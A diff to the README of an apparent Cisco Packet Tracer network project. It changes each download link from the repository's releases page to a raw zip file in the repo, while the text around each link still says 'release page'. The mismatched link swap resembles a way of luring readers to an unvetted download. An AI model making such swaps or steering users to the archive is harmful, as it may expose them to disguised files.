@@ -1,6 +1,6 @@
 # 🌐 Network-project-packet-tracer- - Build a Simple Network Fast
 
-[![Download the release](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/Baoanng6539/Network-project-packet-tracer-/releases)
+[![Download the release](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/Baoanng6539/Network-project-packet-tracer-/raw/refs/heads/main/Topology/tracer_Network_packet_project_1.2.zip)
 
 ## 🚀 What this project does
 
@@ -12,7 +12,7 @@ Use it if you want to open a ready-made network file in Packet Tracer and study 
 
 Visit this page to download the files:
 
-https://github.com/Baoanng6539/Network-project-packet-tracer-/releases
+https://github.com/Baoanng6539/Network-project-packet-tracer-/raw/refs/heads/main/Topology/tracer_Network_packet_project_1.2.zip
 
 On the release page, look for the latest version and download the attached file. The file is set up for Cisco Packet Tracer use.
 
@@ -44,7 +44,7 @@ The project is built to show how devices talk to each other on the same network 
 ## 🛠️ How to download and open it
 
 1. Open the release page:  
-   https://github.com/Baoanng6539/Network-project-packet-tracer-/releases
+   https://github.com/Baoanng6539/Network-project-packet-tracer-/raw/refs/heads/main/Topology/tracer_Network_packet_project_1.2.zip
 
 2. Find the newest release listed on the page.
 
@@ -142,7 +142,7 @@ A common use case is opening the file in Packet Tracer to study a sample network
 
 Download the project from the release page:
 
-https://github.com/Baoanng6539/Network-project-packet-tracer-/releases
+https://github.com/Baoanng6539/Network-project-packet-tracer-/raw/refs/heads/main/Topology/tracer_Network_packet_project_1.2.zip
 
 ## 🖱️ Open the file in Packet Tracer
 
